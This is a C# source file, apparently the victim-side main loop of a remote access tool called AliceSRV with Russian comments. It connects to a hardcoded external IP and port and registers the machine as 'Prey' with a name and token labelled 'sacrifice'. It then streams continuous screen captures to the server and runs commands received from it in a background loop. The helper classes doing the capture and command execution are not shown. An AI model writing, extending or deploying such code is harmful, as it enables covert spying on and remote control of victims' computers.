using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;


namespace AliceSRV
{
    class Program
    {
        static Connection server1;
        static void Main(string[] args)
        {
            //byte[] t = new byte[2];
            //t = BitConverter.GetBytes((int)259);



            Prey _My;
             server1 = new Connection("195.128.124.171", 19999);//("195.128.124.171", 19999);
            if (server1.isConnect)
            {
                _My = new Prey(server1);
                Console.WriteLine(_My.Name_sacrifice + " " + _My.Token_sacrifice);
                server1._SendPreyOnline(_My);
                Console.WriteLine("Ожидаем команды");
                IPEndPoint ipclient = Connection._WhaitAutorization(server1);
                // PrtSC.StartPrtSC(server1, ipclient);
                while (true)
                {
                  string mess=BaseTool.Convertbtst(  server1.Whait_recive());
                    if(BaseTool._GetArrSplit( mess)[0]=="OK")
                    {
                        break;
                    }
                }
                  //  Thread.Sleep(10);
                PrtSC.CutInToParts(server1, ipclient);

                start_recive();
                while (true)
                {
                    PrtSC.Update(server1, ipclient);
                    Thread.Sleep(10);
                }
            }//ожидаем ответа от клиента

            else
            {
                Console.WriteLine("Сервер недоступен!");
                Console.ReadLine();
            }

        }

        public static void start_recive()
        {
            var s = Task.Run(() =>
            {
                while (true)
                {
                    byte[] resp = server1.Whait_recive();
                    Commands._Start(BaseTool._GetArrSplit( BaseTool.Convertbtst(resp)));
                }
            });
        }
                
    }
}
